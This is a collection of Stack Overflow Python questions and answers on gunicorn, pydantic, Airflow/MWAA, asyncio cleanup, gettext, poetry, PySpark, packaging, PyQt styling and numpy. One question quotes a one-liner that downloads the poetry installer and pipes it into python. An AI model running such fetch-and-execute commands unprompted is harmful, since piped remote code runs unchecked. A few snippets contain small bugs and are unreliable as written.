<pre class=""lang-py prettyprint-override""><code>import gevent
from gunicorn.workers.ggevent import GeventWorker


class MyGeventWorker(GeventWorker):

    def handle_request(self, listener_name, req, sock, addr):
        with gevent.Timeout(self.cfg.timeout):
            super().handle_request(listener_name, req, sock, addr)
</code></pre>
<p>Usage:</p>
<pre class=""lang-bash prettyprint-override""><code># gunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent
gunicorn app:app -b 127.0.0.1:5000 -t 5 -k app.MyGeventWorker
</code></pre>
"
"71183960","1","Short way to get all field names of a pydantic class","<p>Minimal example of the class:</p>
<pre><code>from pydantic import BaseModel

class AdaptedModel(BaseModel):
    def get_all_fields(self, alias=False):
        return list(self.schema(by_alias=alias).get(&quot;properties&quot;).keys())

class TestClass(AdaptedModel):
    test: str
</code></pre>
<p>The way it works:</p>
<pre><code>dm.TestClass.get_all_fields(dm.TestClass)
</code></pre>
<p>Is there a way to make it work without giving the class again?</p>
<p>Desired way to get all field names:</p>
<pre><code>dm.TestClass.get_all_fields()
</code></pre>
<p>It would also work if the field names are assigned to an attribute. Just any way to make it make it more readable</p>
","72480774","<p>What about just using <code>__fields__</code>:</p>
<pre><code>from pydantic import BaseModel

class AdaptedModel(BaseModel):
    parent_attr: str

class TestClass(AdaptedModel):
    child_attr: str
        
TestClass.__fields__
</code></pre>
<p>Output:</p>
<pre><code>{'parent_attr': ModelField(name='parent_attr', type=str, required=True),
 'child_attr': ModelField(name='child_attr', type=str, required=True)}
</code></pre>
<p>This is just a dict and you could get only the field names simply by: <code>TestClass.__fields__.keys()</code></p>
<p>See model properties: <a href=""https://pydantic-docs.helpmanual.io/usage/models/#model-properties"" rel=""noreferrer"">https://pydantic-docs.helpmanual.io/usage/models/#model-properties</a></p>
"
"71861779","1","MWAA - Airflow - PythonVirtualenvOperator requires virtualenv","<p>I am using AWS's <a href=""https://docs.aws.amazon.com/mwaa/latest/userguide/what-is-mwaa.html"" rel=""nofollow noreferrer"">MWAA service</a> (2.2.2) to run a variety of DAGs, most of which are implemented with standard PythonOperator types. I bundle the DAGs into an S3 bucket alongside any shared requirements, then point MWAA to the relevant objects &amp; versions. Everything runs smoothly so far.</p>
<p>I would now like to implement a DAG using the <a href=""https://registry.astronomer.io/providers/apache-airflow/modules/pythonvirtualenvoperator"" rel=""nofollow noreferrer"">PythonVirtualenvOperator</a> type, which AWS acknowledge is not supported out of the box. I am following <a href=""https://docs.aws.amazon.com/mwaa/latest/userguide/samples-virtualenv.html"" rel=""nofollow noreferrer"">their guide</a> on how to patch the behaviour using a custom plugin, but continue to receive an error from Airflow, shown at the top of the dashboard in big red writing:</p>
<blockquote>
<p>DAG Import Errors (1)
... ...
AirflowException: PythonVirtualenvOperator requires virtualenv, please install it.</p>
</blockquote>
<p>I've confirmed that the plugin is indeed being picked up by Airflow (I see it referenced in the admin screen), and for the avoidance of doubt I am using the exact code provided by AWS in their examples for the DAG. AWS's documentation on this is pretty light and I've yet to stumble across any community discussion for the same.</p>
<p>From AWS's docs, we'd expect the plugin to run at startup prior to any DAGs being processed. The plugin itself appears to effectively rewrite the venv command to use the pip-installed version, rather than that which is installed on the machine, however I've struggled to verify that things are happening in the order I expect. Any pointers on debugging the instance's behavior would be very much appreciated.</p>
<p>Has anyone faced a similar issue? Is there a gap in the MWAA documentation that needs addressing? Am I missing something incredibly obvious?</p>
<p>Possibly related, but I do see this warning in the scheduler's logs, which may indicate why MWAA is struggling to resolve the dependency?</p>
<blockquote>
<p>WARNING: The script virtualenv is installed in '/usr/local/airflow/.local/bin' which is not on PATH.</p>
</blockquote>
","72203130","<p>Airflow uses shutil.which to look for virtualenv. The installed virtualenv via requirements.txt isn't on the PATH. Adding the path to virtualenv to PATH solves this.</p>
<p>The doc here is wrong <a href=""https://docs.aws.amazon.com/mwaa/latest/userguide/samples-virtualenv.html"" rel=""nofollow noreferrer"">https://docs.aws.amazon.com/mwaa/latest/userguide/samples-virtualenv.html</a></p>
<pre><code>import os
from airflow.plugins_manager import AirflowPlugin
import airflow.utils.python_virtualenv 
from typing import List
def _generate_virtualenv_cmd(tmp_dir: str, python_bin: str, system_site_packages: bool) -&gt; List[str]:
    cmd = ['python3','/usr/local/airflow/.local/lib/python3.7/site-packages/virtualenv', tmp_dir]
    if system_site_packages:
        cmd.append('--system-site-packages')
    if python_bin is not None:
        cmd.append(f'--python={python_bin}')
    return cmd
airflow.utils.python_virtualenv._generate_virtualenv_cmd=_generate_virtualenv_cmd
#This is the added path code
os.environ[&quot;PATH&quot;] = f&quot;/usr/local/airflow/.local/bin:{os.environ['PATH']}&quot;
class VirtualPythonPlugin(AirflowPlugin):                
    name = 'virtual_python_plugin'
</code></pre>
"
"73457379","1","Python regex and leading 0 in capturing group","<p>I'm writing a script in python 3 to automatically rename files. But I have a problem with the captured group in a regex.</p>
<p>I have these kinds of files :</p>
<pre><code>test tome 01 something.cbz
test tome 2 something.cbz
test tome 20 something.cbz
</code></pre>
<p>And I would like to have :</p>
<pre><code>test 001 something.cbz
test 002 something.cbz
test 020 something.cbz
</code></pre>
<p>I tried several bits of code:</p>
<p><strong>Example 1</strong>:</p>
<pre><code>name = re.sub('tome [0]{0,1}(\d{1,})', str('\\1').zfill(3), name)
</code></pre>
<p>The result is:</p>
<pre><code>test 01 something.cbz
test 02 something.cbz
test 020 something.cbz
</code></pre>
<p><strong>Example 2</strong>:</p>
<pre><code>name = re.sub('tome (\d{1,})', str('\\1').lstrip(&quot;0&quot;).zfill(3), name)
</code></pre>
<p>The result is:</p>
<pre><code>test 001 something.cbz
test 02 something.cbz
test 020 something.cbz
</code></pre>
","73457472","<p>You can run the <code>zfill(3)</code> on the <code>.group(1)</code> value after stripping the zeroes from the left side:</p>
<pre><code>import re

s = (&quot;test tome 01 something.cbz\n&quot;
            &quot;test tome 2 something.cbz\n&quot;
            &quot;test tome 20 something.cbz&quot;)

result = re.sub(
    r'tome (\d+)',
    lambda x: x.group(1).lstrip(&quot;0&quot;).zfill(3),
    s
)
print(result)
</code></pre>
<p>Output</p>
<pre><code>test 001 something.cbz
test 002 something.cbz
test 020 something.cbz
</code></pre>
"
"72842597","1","Why is __aexit__ not fully executed when it has await inside?","<p>This is the simplified version of my code:</p>
<p><code>main</code> is a coroutine which stops after the second iteration.<br />
<code>get_numbers</code> is an async generator which yields numbers but within an async context manager.</p>
<pre class=""lang-py prettyprint-override""><code>import asyncio


class MyContextManager:
    async def __aenter__(self):
        print(&quot;Enter to the Context Manager...&quot;)
        return self

    async def __aexit__(self, exc_type, exc_value, exc_tb):
        print(exc_type)
        print(&quot;Exit from the Context Manager...&quot;)
        await asyncio.sleep(1)
        print(&quot;This line is not executed&quot;)  # &lt;-------------------
        await asyncio.sleep(1)


async def get_numbers():
    async with MyContextManager():
        for i in range(30):
            yield i


async def main():
    async for i in get_numbers():
        print(i)
        if i == 1:
            break


asyncio.run(main())
</code></pre>
<p>And the output is:</p>
<pre class=""lang-none prettyprint-override""><code>Enter to the Context Manager...
0
1
&lt;class 'asyncio.exceptions.CancelledError'&gt;
Exit from the Context Manager...
</code></pre>
<p>I have two questions actually:</p>
<ol>
<li>From my understanding, AsyncIO schedules a Task to be <em>called soon</em> in the next cycle of the event loop and gives <code>__aexit__</code> a chance to execute. But the line <code>print(&quot;This line is not executed&quot;)</code> is not executed. Why is that? Is it correct to assume that if we have an <code>await</code> statement inside the <code>__aexit__</code>, the code after that line is not going to execute at all and we shouldn't rely on that for cleaning?</li>
</ol>
<br>
<ol start=""2"">
<li>Output of the <code>help()</code> on async generators shows that:</li>
</ol>
<pre class=""lang-none prettyprint-override""><code> |  aclose(...)
 |      aclose() -&gt; raise GeneratorExit inside generator.
</code></pre>
<p>so why I get <code>&lt;class 'asyncio.exceptions.CancelledError'&gt;</code> exception inside the <code>__aexit__</code> ?</p>
<p><sub>* I'm using Python 3.10.4</sub></p>
","73065347","<p>This is not specific to <code>__aexit__</code> but to all async code: When an event loop shuts down it must decide between <em>cancelling</em> remaining tasks or <em>preserving</em> them. In the interest of cleanup, most frameworks prefer cancellation instead of relying on the programmer to clean up preserved tasks later on.</p>
<p>This kind of shutdown cleanup is a separate mechanism from the graceful unrolling of functions, contexts and similar on the call stack during normal execution. <em>A context manager that must also clean up during cancellation must be specifically prepared for it</em>. Still, in many cases it is fine not to be prepared for this since many resources fail safe by themselves.</p>
<hr />
<p>In contemporary event loop frameworks there are usually three levels of cleanup:</p>
<ul>
<li>Unrolling: The <code>__aexit__</code> is called when the scope ends and might receive an exception that triggered the unrolling as an argument. Cleanup is expected to be delayed as long as necessary. This is comparable to <code>__exit__</code> running synchronous code.</li>
<li>Cancellation: The <code>__aexit__</code> may receive a <code>CancelledError</code><sup>1</sup> as an argument <em>or as an exception on any <code>await</code>/<code>async for</code>/<code>async with</code></em>. Cleanup may delay this, but is expected to proceed as fast as possible. This is comparable to <code>KeyboardInterrupt</code> cancelling synchronous code.</li>
<li>Closing: The <code>__aexit__</code> may receive a <code>GeneratorExit</code> as an argument <em>or as an exception on any <code>await</code>/<code>async for</code>/<code>async with</code></em>. Cleanup must proceed as fast as possible. This is comparable to <code>GeneratorExit</code> closing a synchronous generator.</li>
</ul>
<p>To handle cancellation/closing, any <code>async</code> code – be it in <code>__aexit__</code> or elsewhere – must expect to handle <code>CancelledError</code> or <code>GeneratorExit</code>. While the former may be delayed or suppressed, the latter should be dealt with immediately and synchronously<sup>2</sup>.</p>
<pre><code>    async def __aexit__(self, exc_type, exc_value, exc_tb):
        print(&quot;Exit from the Context Manager...&quot;)
        try:
            await asyncio.sleep(1)  # an exception may arrive here
        except GeneratorExit:
            print(&quot;Exit stage left NOW&quot;)
            raise
        except asyncio.CancelledError:
            print(&quot;Got cancelled, just cleaning up a few things...&quot;)
            await asyncio.sleep(0.5)
            raise
        else:
            print(&quot;Nothing to see here, taking my time on the way out&quot;)
            await asyncio.sleep(1)
</code></pre>
<p><em>Note</em>: It is generally not possible to exhaustively handle these cases. Different forms of cleanup may interrupt one another, such as unrolling being cancelled and then closed. Handling cleanup is only possible on a best effort basis; robust cleanup is achieved by fail safety, for example via transactions, instead of explicit cleanup.</p>
<hr />
<p>Cleanup of asynchronous generators in specific is a tricky case since they can be cleaned up by all cases at once: Unrolling as the generator finishes, cancellation as the owning task is destroyed or closing as the generator is garbage collected. <em>The order at which the cleanup signals arrive is implementation dependent.</em></p>
<p>The proper way to address this is not to rely on implicit cleanup in the first place. Instead, every coroutine should make sure that all its child resources are closed before the parent exits. Notably, an async generator may hold resources and needs closing.</p>
<pre class=""lang-py prettyprint-override""><code>async def main():
    # create a generator that might need cleanup
    async_iter = get_numbers()
    async for i in async_iter:
        print(i)
        if i == 1:
            break
    # wait for generator clean up before exiting
    await async_iter.aclose()
</code></pre>
<p>In recent versions, this pattern is codified via the <a href=""https://docs.python.org/3/library/contextlib.html#contextlib.aclosing"" rel=""nofollow noreferrer""><code>aclosing</code> context manager</a>.</p>
<pre class=""lang-py prettyprint-override""><code>from contextlib import aclosing

async def main():
    # create a generator and prepare for its cleanup
    async with aclosing(get_numbers()) as async_iter:
        async for i in async_iter:
            print(i)
            if i == 1:
                break
</code></pre>
<hr />
<p><sup>1</sup>The name and/or identity of this exception may vary.</p>
<p><sup>2</sup>While it is possible to <code>await</code> asynchronous things during <code>GeneratorExit</code>, they may not yield to the event loop. A synchronous interface is advantageous to enforce this.</p>
"
"72225191","1","How can I apply gettext translations to string literals in case statements?","<p>I need to add gettext translation to all the string literals in our code, but it doesn't work with literals in case statements.</p>
<p>This failed attempt gives <code>SyntaxError: Expected ':'</code>:</p>
<pre><code>from gettext import gettext as _

direction = input(_('Enter a direction: '))   # &lt;-- This works
match direction:
    case _('north'):                          # &lt;-- This fails
        adj = 1, 0
    case _('south'):
        adj = -1, 0
    case _('east'):
        adj = 0, 1
    case _('west'):
        adj = 0, -1
    case _:
        raise ValueError(_('Unknown direction'))
</code></pre>
<p>What does the error mean and how can the directions be marked for translation?</p>
","72225192","<h2>What does the error mean?</h2>
<p>The grammar for the match/case statement treats the <code>_</code> as a <a href=""https://peps.python.org/pep-0634/#wildcard-pattern"" rel=""nofollow noreferrer"">wildcard pattern</a>.  The only acceptable token that can follow is a colon.  Since your code uses an open parenthesis, a <em>SyntaxError</em> is raised.</p>
<h2>How to fix it</h2>
<p>Switch from a <a href=""https://peps.python.org/pep-0634/#literal-patterns"" rel=""nofollow noreferrer"">literal pattern</a> such as <code>case &quot;north&quot;: ...</code> to a <a href=""https://peps.python.org/pep-0634/#value-patterns"" rel=""nofollow noreferrer"">value pattern</a> such as <code>case Directions.north: ...</code> which uses dot-operator.</p>
<p>The translation can then be performed upstream, outside of the case statement:</p>
<pre><code>from gettext import gettext as _

class Directions:
    north = _('north')
    south = _('south')
    east = _('east')
    west = _('west')

direction = input(_('Enter a direction: '))
match direction:
    case Directions.north:
        adj = 1, 0
    case Directions.south:
        adj = -1, 0
    case Directions.east:
        adj = 0, 1
    case Directions.west:
        adj = 0, -1
    case _:
        raise ValueError(_('Unknown direction'))
</code></pre>
<p>Not only do the string literals get translated, the case statements are more readable as well.</p>
<h2>More advanced and dynamic solution</h2>
<p>The above solution only works if the choice of language is constant.  If the language can change (perhaps in an online application serving users from difference countries), dynamic lookups are needed.</p>
<p>First we need a <a href=""https://docs.python.org/3/howto/descriptor.html"" rel=""nofollow noreferrer"">descriptor</a> to dynamically forward <em>value</em> pattern attribute lookups to function calls:</p>
<pre><code>class FuncCall:
    &quot;Descriptor to convert fc.name to func(name).&quot;

    def __init__(self, func):
        self.func = func

    def __set_name__(self, owner, name):
        self.name = name

    def __get__(self, obj, objtype=None):
        return self.func(self.name)
</code></pre>
<p>We use it like this:</p>
<pre><code>class Directions:
    north = FuncCall(_)  # calls _('north') for every lookup
    south = FuncCall(_)
    east = FuncCall(_)
    west = FuncCall(_)

def convert(direction):
    match direction:
        case Directions.north:
            return 1, 0
        case Directions.south:
            return -1, 0
        case Directions.east:
            return 0, 1
        case Directions.west:
            return 0, -1
        case _:
            raise ValueError(_('Unknown direction'))
    print('Adjustment:', adj)
</code></pre>
<p>Here is a sample session:</p>
<pre><code>&gt;&gt;&gt; set_language('es')   # Spanish
&gt;&gt;&gt; convert('sur')
(-1, 0)
&gt;&gt;&gt; set_language('fr')   # French
&gt;&gt;&gt; convert('nord')
(1, 0)
</code></pre>
<h2>Namespaces for the Value Pattern</h2>
<p>Any namespace with dotted lookup can be used in the value pattern:  SimpleNamespace, Enum, modules, classes, instances, etc.</p>
<p>Here a class was chosen because it is simple and will work with the descriptor needed for the more advanced solution.</p>
<p>Enum wasn't considered because it is much more complex and because its metaclass logic interferes with the descriptors.  Also, Enum is intended for giving symbolic names to predefined constants rather than for dynamically computed values like we're using here.</p>
"
"72298911","1","Where to locate virtual environment installed using poetry | Where to find poetry installed virtual environment","<p>I installed poetry using the following command:-<br>
<code>(Invoke-WebRequest -Uri https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py -UseBasicParsing).Content | python -</code> <br>
To know more about it refer <a href=""https://python-poetry.org/docs/#installation"" rel=""noreferrer"">this</a>.</p>
<p>Now I wanted to create a virtual environment, that I created it using the following command:-<br>
<code>poetry config virtualenvs.in-project true</code><br>
To know more about it refer <a href=""https://python-poetry.org/docs/configuration/#virtualenvsin-project"" rel=""noreferrer"">this</a>.</p>
<p>But after doing this, I can`t see any .venv(virtual environment) folder.</p>
<p>To check if virtual environment is there, we use the following command:-<br>
<code>poetry config virtualenvs.in-project</code><br>
and if the above command return <code>true</code>, implies you have it.</p>
<p>I'm getting <code>true</code>, also the location mentioned on the <a href=""https://python-poetry.org/docs/configuration/#virtualenvsin-project"" rel=""noreferrer"">docs</a> I cant see it there.</p>
<p>Could anyone tell me how to locate the virtual environment now?</p>
","72298912","<p>There are 2 commands I found, that can find where is the virtual environment is located.</p>
<ol>
<li><p>Command:- <code>poetry show -v</code><br />
The first line of $ poetry show -v will tell you where the virtual environment is located.<br>
And the rest will tell you what all libs are there in it.</p>
</li>
<li><p>Command:- <code>poetry env info -p</code><br>
The above command will give you just the location of virtual environment.</p>
</li>
</ol>
<p>Hope this will solve your purpose.</p>
<p>Thank you.</p>
"
"73395718","1","Join dataframes and rename resulting columns with same names","<p>Shortened example:</p>
<pre><code>vals1 = [(1, &quot;a&quot;), 
        (2, &quot;b&quot;), 
      ]
columns1 = [&quot;id&quot;,&quot;name&quot;]
df1 = spark.createDataFrame(data=vals1, schema=columns1)

vals2 = [(1, &quot;k&quot;), 
      ]
columns2 = [&quot;id&quot;,&quot;name&quot;]
df2 = spark.createDataFrame(data=vals2, schema=columns2)

df1 = df1.alias('df1').join(df2.alias('df2'), 'id', 'full')
df1.show()
</code></pre>
<p>The result has one column named <code>id</code> and two columns named <code>name</code>. How do I rename the columns with duplicate names, assuming that the real dataframes have tens of such columns?</p>
","73459268","<p>Another method to rename only the intersecting columns</p>
<pre><code>from typing import List

from pyspark.sql import DataFrame


def join_intersect(df_left: DataFrame, df_right: DataFrame, join_cols: List[str], how: str = 'inner'):
    intersected_cols = set(df1.columns).intersection(set(df2.columns))
    cols_to_rename = [c for c in intersected_cols if c not in join_cols]

    for c in cols_to_rename:
        df_left = df_left.withColumnRenamed(c, f&quot;{c}__1&quot;)
        df_right = df_right.withColumnRenamed(c, f&quot;{c}__2&quot;)

    return df_left.join(df_right, on=join_cols, how=how)


vals1 = [(1, &quot;a&quot;), (2, &quot;b&quot;)]
columns1 = [&quot;id&quot;, &quot;name&quot;]
df1 = spark.createDataFrame(data=vals1, schema=columns1)
vals2 = [(1, &quot;k&quot;)]
columns2 = [&quot;id&quot;, &quot;name&quot;]
df2 = spark.createDataFrame(data=vals2, schema=columns2)

df_joined = join_intersect(df1, df2, ['name'])
df_joined.show()
</code></pre>
"
"72352801","1","Migration from setup.py to pyproject.toml: how to specify package name?","<p>I'm currently trying to move our internal projects away from <code>setup.py</code> to <code>pyproject.toml</code> (<a href=""https://peps.python.org/pep-0518"" rel=""noreferrer"">PEP-518</a>). I'd like to not use build backend specific configuration if possible, even though I do specify the backend in the <code>[build-system]</code> section by <code>require</code>'ing it.</p>
<p>The <code>pyproject.toml</code> files are more or less straight-forward translations of the <code>setup.py</code> files, with the metadata set according to <a href=""https://peps.python.org/pep-0621"" rel=""noreferrer"">PEP-621</a>, including the <code>dependencies</code>. We are using <code>setuptools_scm</code> for the determination of the version, therefore the <code>version</code> field ends up in the <code>dynamic</code> section.</p>
<p>We used to set the <code>packages</code> parameter to <code>setup</code> in our <code>setup.py</code> files, but I couldn't find any corresponding field in <code>pyproject.toml</code>, so I simply omitted it.</p>
<p>When building the project using <code>python3 -m build .</code>, I end up with a package named <code>UNKNOWN</code>, even though I have the <code>name</code> field set in the <code>[project]</code> section. It seems that this breaks very early in the build:</p>
<pre><code>$ python -m build .
* Creating virtualenv isolated environment...
* Installing packages in isolated environment... (setuptools, setuptools_scm[toml]&gt;=6.2, wheel)
* Getting dependencies for sdist...
running egg_info
writing UNKNOWN.egg-info/PKG-INFO
....
</code></pre>
<p>I'm using python 3.8.11 and the following packages:</p>
<pre><code>build==0.8.0
distlib==0.3.4
filelock==3.4.1
packaging==21.3
pep517==0.12.0
pip==22.0.4
platformdirs==2.4.0
pyparsing==3.0.9
setuptools==62.1.0
six==1.16.0
tomli==1.2.3
virtualenv==20.14.1
wheel==0.37.1
</code></pre>
<p>My (abbreviated) <code>pyproject.toml</code> looks like this:</p>
<pre><code>[project]
name = &quot;coolproject&quot;
dependencies = [
   'pyyaml==5.3',
   'anytree==2.8.0',
   'pytest'
]
dynamic = [
   &quot;version&quot;
]

[build-system]
requires = [&quot;setuptools&quot;, &quot;wheel&quot;, &quot;setuptools_scm[toml]&gt;=6.2&quot;]

[tool.setuptools_scm]
</code></pre>
<p>Any ideas?</p>
","73497494","<p>Turning @AKX's comments into an answer so that other people can find it more easily.</p>
<p>The problem may be an outdated pip/setuptools on the system. Apparently, version 19.3.1 which I have on my system  cannot install a version of setuptools that can handle PEP621 metadata correctly.</p>
<p>You cannot require a new pip from within pyproject.toml using the <code>build-system.requires</code> directive.</p>
<p>In case you cannot update the system pip, you can always install on a per-user basis:</p>
<pre><code>pip install --user pip
</code></pre>
<p>and you're good to go.</p>
"
"73013333","1","How to make an Angled arrow style border in PyQt5?","<p>How to make an Angled arrow-type border in PyQt QFrame? In My code, I Have two QLabels and respective frames. My aim is to make an arrow shape border on right side of every QFrame.For clear-cut idea, attach a sample picture.</p>
<pre><code>import sys
from PyQt5.QtWidgets import *

class Angle_Border(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(&quot;Angle Border&quot;)

        self.lbl1 = QLabel(&quot;Python&quot;)
        self.lbl2 = QLabel(&quot;PyQt&quot;)

        self.frame1 = QFrame()
        self.frame1.setProperty(&quot;type&quot;,&quot;1&quot;)
        self.frame1.setFixedSize(200,50)
        self.frame1.setStyleSheet(&quot;background-color:red;color:white;&quot;
                                  &quot;font-family:Trebuchet MS;font-size: 15pt;text-align: center;&quot;
                                  &quot;border-top-right-radius:25px solid ; border-bottom-right-radius:25px solid ;&quot;)
        self.frame2 = QFrame()
        self.frame2.setFixedSize(200, 50)
        self.frame2.setStyleSheet(&quot;background-color:blue;color:white;&quot;
                                  &quot;font-family:Trebuchet MS;font-size: 15pt;text-align: center;&quot;
                                  &quot;border-top:1px solid transparent; border-bottom:1px solid  transparent;&quot;)
        self.frame_outer = QFrame()
        self.frame_outer.setFixedSize(800, 60)
        self.frame_outer.setStyleSheet(&quot;background-color:green;color:white;&quot;
                                  &quot;font-family:Trebuchet MS;font-size: 15pt;text-align: center;&quot;)

        self.frame1_layout = QHBoxLayout(self.frame1)
        self.frame2_layout = QHBoxLayout(self.frame2)
        self.frame_outer_layout = QHBoxLayout(self.frame_outer)
        self.frame_outer_layout.setContentsMargins(5,0,0,0)

        self.frame1_layout.addWidget(self.lbl1)
        self.frame2_layout.addWidget(self.lbl2)

        self.hbox = QHBoxLayout()
        self.layout = QHBoxLayout()
        self.hbox.addWidget(self.frame1)
        self.hbox.addWidget(self.frame2)
        self.hbox.addStretch()
        self.hbox.setSpacing(0)
        # self.layout.addLayout(self.hbox)
        self.frame_outer_layout.addLayout(self.hbox)
        self.layout.addWidget(self.frame_outer)

        self.setLayout(self.layout)

def main():
    app = QApplication(sys.argv)
    ex = Angle_Border()
    ex.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
</code></pre>
<p><strong>Sample Picture</strong>
<a href=""https://i.stack.imgur.com/FAs4H.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/FAs4H.png"" alt=""enter image description here"" /></a></p>
","73104110","<p>Since the OP didn't ask for user interaction (mouse or keyboard), a possible solution could use the existing features of Qt, specifically QSS (Qt Style Sheets).</p>
<p>While the <s>currently</s> previously accepted <a href=""https://stackoverflow.com/a/73090177/2001654"">solution</a> <em>does</em> follow that approach, it's not very effective, most importantly because it's basically &quot;static&quot;, since it always requires knowing the color of the following item in order to define the &quot;arrow&quot; colors.<br />
This not only forces the programmer to always consider the &quot;sibling&quot; items, but also makes extremely (and unnecessarily) complex the dynamic creation of such objects.</p>
<p>The solution is to always (partially) &quot;redo&quot; the layout and update the stylesheets with the necessary values, which consider the current size (which shouldn't be hardcoded), the <em>following</em> item (if any) and carefully using the layout properties and &quot;spacer&quot; stylesheets based on the contents.</p>
<p>The following code uses a more abstract, dynamic approach, with basic functions that allow adding/insertion and removal of items. It still uses a similar QSS method, but, with almost the same &quot;line count&quot;, it provides a simpler and much more intuitive approach, allowing item creation, deletion and modification with single function calls that are much easier to use.</p>
<p>A further benefit of this approach is that implementing &quot;reverse&quot; arrows is quite easy, and doesn't break the logic of the item creation.</p>
<p>Considering all the above, you can create an <em>actual</em> class that just needs basic calls such as <code>addItem()</code> or <code>removeItem()</code>.</p>
<pre class=""lang-py prettyprint-override""><code>from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *

class ArrowMenu(QWidget):
    vMargin = -1
    hMargin = -1
    def __init__(self, items=None, parent=None):
        super().__init__(parent)
        layout = QHBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addStretch()
        self.items = []
        if isinstance(items, dict):
            self.addItems(items.items())
        elif items is not None:
            self.addItems(items)

    def addItems(self, items):
        for item in items:
            if isinstance(item, str):
                self.addItem(item)
            else:
                self.addItem(*item)

    def addItem(self, text, background=None):
        self.insertItem(len(self.items), text, background)

    def insertItem(self, index, text, background=None):
        label = QLabel(text)
        if background is None:
            background = self.palette().window().color()
            background.setAlpha(0)
        else:
            background = QColor(background)

        # human eyes perceive &quot;brightness&quot; in different ways, let's compute
        # that value in order to decide a color that has sufficient contrast
        # with the background; see https://photo.stackexchange.com/q/10412
        r, g, b, a = background.getRgbF()
        brightness = r * .3 + g * .59 + b * .11
        foreground = 'black' if brightness &gt;= .5 else 'white'

        label.setStyleSheet('color: {}; background: {};'.format(
            foreground, background.name(background.HexArgb)))

        layout = self.layout()
        if index &lt; len(self.items):
            i = 0
            for _label, _spacer, _ in self.items:
                if i == index:
                    i += 1
                layout.insertWidget(i * 2, _label)
                layout.insertWidget(i * 2 + 1, _spacer)
                i += 1

        layout.insertWidget(index * 2, label)
        spacer = QWidget(objectName='menuArrow')
        layout.insertWidget(index * 2 + 1, spacer)
        self.items.insert(index, (label, spacer, background))
        self.updateItems()

    def removeItem(self, index):
        label, spacer, background = self.items.pop(index)
        label.deleteLater()
        spacer.deleteLater()
        layout = self.layout()
        for i, (label, spacer, _) in enumerate(self.items):
            layout.insertWidget(i * 2, label)
            layout.insertWidget(i * 2 + 1, spacer)
        self.updateItems()
        self.updateGeometry()

    def updateItems(self):
        if not self.items:
            return

        size = self.fontMetrics().height()
        if self.vMargin &lt; 0:
            vSize = size * 2
        else:
            vSize = size + self.vMargin * 2
        spacing = vSize / 2
        self.setMinimumHeight(vSize)
        if self.hMargin &gt;= 0:
            labelMargin = self.hMargin * 2
        else:
            labelMargin = size // 2

        it = iter(self.items)
        prevBackground = prevSpacer = None
        while True:
            try:
                label, spacer, background = next(it)
                label.setContentsMargins(labelMargin, 0, labelMargin, 0)
                spacer.setFixedWidth(spacing)

            except StopIteration:
                background = QColor()
                break

            finally:
                if prevBackground:
                    if background.isValid():
                        cssBackground = background.name(QColor.HexArgb)
                    else:
                        cssBackground = 'none'
                    if prevBackground.alpha():
                        prevBackground = prevBackground.name(QColor.HexArgb)
                    else:
                        mid = QColor(prevBackground)
                        mid.setAlphaF(.5)
                        prevBackground = '''
                            qlineargradient(x1:0, y1:0, x2:1, y2:0,
                            stop:0 {}, stop:1 {})
                        '''.format(
                            prevBackground.name(QColor.HexArgb), 
                            mid.name(QColor.HexArgb), 
                            )
                    prevSpacer.setStyleSheet('''
                        ArrowMenu &gt; .QWidget#menuArrow {{
                            background: transparent;
                            border-top: {size}px solid {background};
                            border-bottom: {size}px solid {background};
                            border-left: {spacing}px solid {prevBackground};
                        }}
                    '''.format(
                            size=self.height() // 2, 
                            spacing=spacing, 
                            prevBackground=prevBackground, 
                            background=cssBackground
                    ))

                prevBackground = background
                prevSpacer = spacer

    def resizeEvent(self, event):
        self.updateItems()


if __name__ == '__main__':
    import sys
    app = QApplication(sys.argv)
    items = (
            ('Python', 'green'), 
            ('Will delete', 'chocolate'), 
            ('PyQt5', 'red'), 
            ('Java', 'blue'), 
            ('ASP.Net', 'yellow'), 
        )
    ex = ArrowMenu(items)
    ex.show()
    QTimer.singleShot(2000, lambda: ex.addItem('New item', 'aqua'))
    QTimer.singleShot(5000, lambda: ex.removeItem(1))
    sys.exit(app.exec_())
</code></pre>
<p>And here is the result:</p>
<p><a href=""https://i.stack.imgur.com/CqswU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CqswU.png"" alt=""screenshot of the example"" /></a></p>
"
"72604922","1","How to convert Python dataclass to dictionary of string literal?","<p>Given a dataclass like below:</p>
<pre><code>class MessageHeader(BaseModel):
    message_id: uuid.UUID

    def dict(self, **kwargs):
        return json.loads(self.json())
</code></pre>
<p>I would like to get a dictionary of string literal when I call <code>dict</code> on <code>MessageHeader</code>
The desired outcome of dictionary is like below:</p>
<pre><code>{'message_id': '383b0bfc-743e-4738-8361-27e6a0753b5a'}
</code></pre>
<p>I want to avoid using 3rd party library like <code>pydantic</code> &amp; I do not want to use <code>json.loads(self.json())</code> as there are extra round trips</p>
<p>Is there any better way to convert a dataclass to a dictionary with string literal like above?</p>
","72605423","<p>You can use <a href=""https://docs.python.org/3/library/dataclasses.html#dataclasses.asdict"" rel=""noreferrer""><code>dataclasses.asdict</code></a>:</p>
<pre><code>from dataclasses import dataclass, asdict

class MessageHeader(BaseModel):
    message_id: uuid.UUID

    def dict(self):
        return {k: str(v) for k, v in asdict(self).items()}
</code></pre>
<p>If you're sure that your class only has string values, you can skip the dictionary comprehension entirely:</p>
<pre><code>class MessageHeader(BaseModel):
    message_id: uuid.UUID

    dict = asdict
</code></pre>
"
"73548604","1","Create 2D Matrix of ascending integers in diagonal/triangle-like order with Numpy","<p>How do I create a matrix of ascending integers that are arrayed like this example of <code>N=6</code>?</p>
<pre><code>1  3  6
2  5  0 
4  0  0
</code></pre>
<p>Here another example for <code>N=13</code>:</p>
<pre><code>1  3  6  10 0
2  5  9  13 0
4  8  12 0  0
7  11 0  0  0
10 0  0  0  0
</code></pre>
<p>Also, the solution should perform well for large <code>N</code> values.</p>
<p>My code</p>
<pre><code>import numpy as np
N = 13
array_dimension = 5
x = 0
y = 1
z = np.zeros((array_dimension,array_dimension))
z[0][0] = 1
for i in range(2, N+1):
    z[y][x] = i
    if y == 0:
        y = (x + 1)
        x = 0
    else:
        x += 1
        y -= 1
print(z)
